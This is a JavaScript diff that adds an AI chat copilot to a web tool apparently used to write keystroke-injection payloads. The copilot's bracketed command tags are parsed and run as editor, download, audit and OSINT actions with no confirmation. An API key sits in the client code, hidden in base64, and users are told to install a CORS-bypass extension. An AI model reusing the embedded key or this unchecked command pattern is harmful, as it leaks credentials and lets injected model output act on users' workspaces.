+      model: userConfig.model || 'custom-model',
+      messages: [
+        { role: 'system', content: 'You are the Forge AI Copilot. You can execute interface commands by appending [CMD: ACTION | PARAM]. Actions: [CMD: WRITE_SCRIPT | code], [CMD: SWITCH_VIEW | view_id], [CMD: EXPORT_VAULT | name], [CMD: DOWNLOAD_SCRIPT], [CMD: CLEAR_EDITOR], [CMD: RUN_SPEED_TEST], [CMD: RUN_AUDIT], [CMD: RUN_OSINT]. Keep answers short and concise.' },
+        { role: 'user', content: query }
+      ],
+      temperature: 0.7,
+      stream: true
+    };
+  } else {
+    key = atob('bnZhcGktMUl1TER5aE9ZSDdwdHBScVM4V1ZfRkZ4VnVjNHEtUUJHVG5HWEZ4OWkzNDJfX0FjcFptUkZMRmFLNC1iTS1YSFQ=');
+    url = 'https://integrate.api.nvidia.com/v1/chat/completions';
+    body = {
+      model: 'nvidia/nemotron-3-super-120b-a12b',
+      messages: [
+        { role: 'system', content: 'You are the Forge AI Copilot. You can execute interface commands by appending [CMD: ACTION | PARAM]. Actions: [CMD: WRITE_SCRIPT | code], [CMD: SWITCH_VIEW | view_id], [CMD: EXPORT_VAULT | name], [CMD: DOWNLOAD_SCRIPT], [CMD: CLEAR_EDITOR], [CMD: RUN_SPEED_TEST], [CMD: RUN_AUDIT], [CMD: RUN_OSINT]. Keep answers short and concise.' },
+        { role: 'user', content: query }
+      ],
+      temperature: 1,
+      top_p: 0.95,
+      max_tokens: 2048,
+      reasoning_budget: 1024,
+      chat_template_kwargs: { "enable_thinking": true },
+      stream: true
+    };
+  }
+
+  try {
+    const headers = {
+      'Content-Type': 'application/json'
+    };
+    if (key) {
+      headers['Authorization'] = 'Bearer ' + key;
+    }
+
+    const resp = await fetch(url, {
+      method: 'POST',
+      headers: headers,
+      body: JSON.stringify(body)
+    });
+
+    if (!resp.ok) {
+      const errData = await resp.json();
+      throw new Error(errData.error?.message || 'HTTP error ' + resp.status);
+    }
+
+    // Remove thinking message
+    const thinkEl = document.getElementById(thinkingId);
+    if (thinkEl) thinkEl.remove();
+
+    // Create empty placeholder message for streaming
+    const aiMsgId = appendBotMsg('', 'ai');
+    const bubble = document.querySelector(`#${aiMsgId} .msg-bubble`);
+    if (!bubble) return;
+    
+    const reader = resp.body.getReader();
+    const decoder = new TextDecoder('utf-8');
+    let buffer = '';
+    let textContent = '';
+
+    while (true) {
+      const { done, value } = await reader.read();
+      if (done) break;
+
+      buffer += decoder.decode(value, { stream: true });
+      const lines = buffer.split('\n');
+      buffer = lines.pop(); // Keep last incomplete chunk
+
+      for (const line of lines) {
+        const cleaned = line.trim();
+        if (!cleaned || !cleaned.startsWith('data:')) continue;
+        if (cleaned === 'data: [DONE]') continue;
+
+        try {
+          const parsed = JSON.parse(cleaned.substring(5).trim());
+          const content = parsed.choices?.[0]?.delta?.content || '';
+          if (content) {
+            textContent += content;
+            // Strip out [CMD: ...] tags from the visible text for clean rendering
+            const cleanText = textContent.replace(/\[CMD:\s*(\w+)\s*(?:\|\s*([\s\S]*?))?\]/gi, '').trim();
+            bubble.innerHTML = cleanText ? cleanText.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>') : 'Executing commands...';
+            document.getElementById('botMessages').scrollTop = document.getElementById('botMessages').scrollHeight;
+          }
+        } catch (e) {
+          // ignore parsing error on half line chunks
+        }
+      }
+    }
+
+    // Parse and execute commands
+    executeBotCommandsFromText(textContent);
+
+  } catch (err) {
+    const thinkEl = document.getElementById(thinkingId);
+    if (thinkEl) thinkEl.remove();
+    
+    let errMsg = 'Error: ' + err.message;
+    const isCorsErr = err.message === 'Failed to fetch' || 
+                      err.message?.toLowerCase().includes('failed to fetch') || 
+                      err.message?.toLowerCase().includes('networkerror') || 
+                      err.message?.toLowerCase().includes('load failed');
+    if (isCorsErr) {
+      errMsg += '\n\n💡 CORS block detected. Turn on a browser extension like "Allow CORS: Access-Control-Allow-Origin" or configure custom gateway credentials in settings.';
+    }
+    appendBotMsg(errMsg, 'ai');
+  }
+};
+
+function appendBotMsg(text, role, isThinking = false) {
+  const container = document.getElementById('botMessages');
+  if (!container) return '';
+
+  const id = 'bot-msg-' + Math.random().toString(36).substr(2, 9);
+  const div = document.createElement('div');
+  div.id = id;
+  div.className = 'msg ' + role;
+  div.style.display = 'flex';
+  div.style.flexDirection = 'column';
+  div.style.gap = '0.2rem';
+  div.style.maxWidth = '85%';
+  if (role === 'user') {
+    div.style.alignSelf = 'flex-end';
+  } else {
+    div.style.alignSelf = 'flex-start';
+  }
+
+  let html = '';
+  if (role === 'user') {
+    html = `<div class="msg-bubble" style="background: rgba(8, 247, 254, 0.04); border: 1px solid rgba(8, 247, 254, 0.25); padding: 0.6rem 0.8rem; border-radius: 8px; border-bottom-right-radius: 2px; color: var(--white); word-break: break-word;">${text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\n/g, '<br>')}</div>`;
+    html += `<div style="font-size: 0.54rem; color: var(--muted); padding-right: 0.2rem; text-align: right;">YOU · ${new Date().toLocaleTimeString()}</div>`;
+  } else {
+    const innerText = isThinking ? `<div class="scan-spinner" style="display:inline-block; width:12px; height:12px; margin-right:6px;"></div>${text}` : text;
+    html = `<div class="msg-bubble" style="background: rgba(0, 255, 65, 0.04); border: 1px solid var(--gbord); padding: 0.6rem 0.8rem; border-radius: 8px; border-bottom-left-radius: 2px; color: var(--white); word-break: break-word;">${innerText}</div>`;
+    html += `<div style="font-size: 0.54rem; color: var(--muted); padding-left: 0.2rem;">COPILOT · SYSTEM</div>`;
+  }
+
+  div.innerHTML = html;
+  container.appendChild(div);
+  container.scrollTop = container.scrollHeight;
+  return id;
+}
+
+function executeBotCommandsFromText(text) {
+  const regex = /\[CMD:\s*(\w+)\s*(?:\|\s*([\s\S]*?))?\]/gi;
+  let match;
+  while ((match = regex.exec(text)) !== null) {
+    const cmd = match[1].toUpperCase();
+    const param = match[2] ? match[2].trim() : '';
+    
+    console.log('AI EXECUTE COMMAND:', cmd, 'WITH PARAM:', param);
+    
+    if (cmd === 'WRITE_SCRIPT') {
+      const editor = document.getElementById('srcEditor');
+      if (editor) {
+        editor.value = param;
+        if (typeof lintSource === 'function') lintSource(param);
+        if (typeof updateEditorCounts === 'function') updateEditorCounts();
+        toast('AI updated IDE workspace', 'ok');
+      }
+    } else if (cmd === 'SWITCH_VIEW') {
+      if (typeof switchView === 'function') switchView(param);
+    } else if (cmd === 'CLEAR_EDITOR') {
+      const editor = document.getElementById('srcEditor');
+      if (editor) {
+        editor.value = '';
+        if (typeof lintSource === 'function') lintSource('');
+        if (typeof updateEditorCounts === 'function') updateEditorCounts();
+        toast('Workspace cleared by AI', 'info');
+      }
+    } else if (cmd === 'EXPORT_VAULT') {
+      const saveName = document.getElementById('saveName');
+      if (saveName) saveName.value = param || 'AI Generated';
+      if (typeof openSaveModal === 'function') openSaveModal();
+    } else if (cmd === 'DOWNLOAD_SCRIPT') {
+      const content = document.getElementById('srcEditor')?.value;
+      if (content) {
+        if (typeof downloadTxt === 'function') downloadTxt(content, param || 'payload.ds');
+      }
+    } else if (cmd === 'RUN_SPEED_TEST') {
+      if (typeof runSpeedTest === 'function') runSpeedTest();
+    } else if (cmd === 'RUN_AUDIT') {
+      if (typeof runComplianceAudit === 'function') runComplianceAudit();
+    } else if (cmd === 'RUN_OSINT') {
+      if (typeof runOSINT === 'function') runOSINT();
+    } else if (cmd === 'SHOW_MANUAL') {
+      openUserManual(param);
+    }
+  }
+}
 
 // Auto-init when DOM loads
 if (document.readyState === 'loading') {
